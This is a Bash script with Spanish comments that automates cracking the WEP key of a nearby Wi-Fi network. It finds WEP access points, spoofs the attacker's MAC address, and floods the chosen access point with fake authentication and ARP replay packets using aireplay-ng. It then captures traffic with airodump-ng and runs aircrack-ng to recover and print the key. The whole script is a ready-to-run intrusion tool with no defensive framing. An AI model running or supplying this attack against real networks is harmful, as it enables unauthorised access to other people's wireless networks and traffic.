#!/bin/bash
# Redux supercutre de airoscript usando Arp Replay.
set -o nounset
set -o posix
trap clean INT TERM EXIT

verde() { echo -ne "\e[32m# $1\e[m"; }
RND="cap_$RANDOM$RANDOM"

# Esto dejará todo el patio limpio.
clean() {
    verde "Bajando adaptadores en modo monitor:\n"
    airmon-ng | sed -n 's@^\(mon[0-9]\+\).*@\1@p'| xargs -n1 airmon-ng stop | grep -v '^$'
    verde "Limpiando temporales y matando procesos que puedan quedar:\n"
    rm -v $RND* replay_* 2>/dev/null
    pgrep -f $RND | xargs kill -9 2>/dev/null
    verde "OK\n"
}

# Verificamos binarios.
verde "System check!\n"
which screen airmon-ng airodump-ng aireplay-ng aircrack-ng macchanger ifconfig iwlist || exit 1

# Esto necesita poderes místicos.
[ $USER = "root" ] || exit 1

# Usamos la última NIC wifi que pillemos
WIFACE=$(iwconfig 2>&1 | sed -n 's/\([0-9a-z]\+\) \+IEEE.*/\1/p' | tail -1)
verde "Esnifaremos en $WIFACE"

# Lanzamos wlan en modo monitor para buscar ESSIDs.
verde "Iniciamos Adaptador, escribiremos en ${RND}.*"
airmon-ng start $WIFACE || exit 1
time screen -S airodump airodump-ng -w $RND mon0

# Ordenamos el listado de APs detectados por su señal.
sort -V -t"," -k 9 $RND-01.csv > $RND-01.csv.sorted

# Listamos los aps bajo WEP detectados.
verde "APs detectados de mejor a peor señal:\n"
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
if [ "$PRIVACY" = " WEP " ]; then
    i=$(($i+1))
    echo -e "$i)  $MAC\t$CHANNEL\t$PRIVACY\t$POWER\t$ESSID"
    aessid[$i]=${ESSID// /}
    achannel[$i]=${CHANNEL// /}
    amac[$i]=${MAC// /}
fi
done < $RND-01.csv.sorted
[ $i -eq 0 ] && exit 1

# Loop hasta conseguir un input correcto
while true; do
    verde "Seleccionar AP del 1 al $i:\n"
    read -r choice
    [ $choice -ge 1 ] && [ $choice -le $i ] && break
done

#airmon-ng stop mon0
verde "Ponemos la interficie monitor en el canal ${achannel[$choice]}:\n"
airmon-ng start $WIFACE ${achannel[$choice]}

# Paso de martillear el AP con mi mac adress.
verde "Falseando MAC:\n"
#ifconfig mon0 down
macchanger -A mon0
MYMAC=$(macchanger -s mon0 | sed -n 's/Current MAC: *\([0-9a-f\:]\+\) (.*/\1/p')
verde "Nuestra MAC ahora es $MYMAC"
wlist mon0 channel

# Creamos un fichero .screenrc custom para 'splitear' aireplay/airodump en una sesión de screen.
cat > ${RND}.screenrc <<EOF
startup_message off
zombie cr
screen -t Auth   0 aireplay-ng -1 6000 -o 1 -q 10 -e ${aessid[$choice]} -a ${amac[$choice]} -h $MYMAC mon0
split
focus
screen -t Replay 1 aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b ${amac[$choice]} -h $MYMAC mon0
split
focus
screen -t Dump   2 airodump-ng -c ${achannel[$choice]} --bssid ${amac[$choice]} -w $RND mon0
split
focus
screen -t Crack  3 aircrack-ng -0 -b ${amac[$choice]} -l ${RND}.key ${RND}-02.cap
EOF

# Efectuamos el ataque en si.
verde "Ataque ARP REPLAY\n"
time screen -S wepfrit -c ${RND}.screenrc

# Presentamos la clave si aplica.
[ -f $RND.key ] && {
    OUTSTR="${aessid[$choice]} CH: ${achannel[$choice]} MAC: ${amac[$choice]} KEY: $(cat $RND.key)"
    verde "Clave encontrada:\n\n"
    verde "$OUTSTR\n\n"
    touch "$OUTSTR"
}
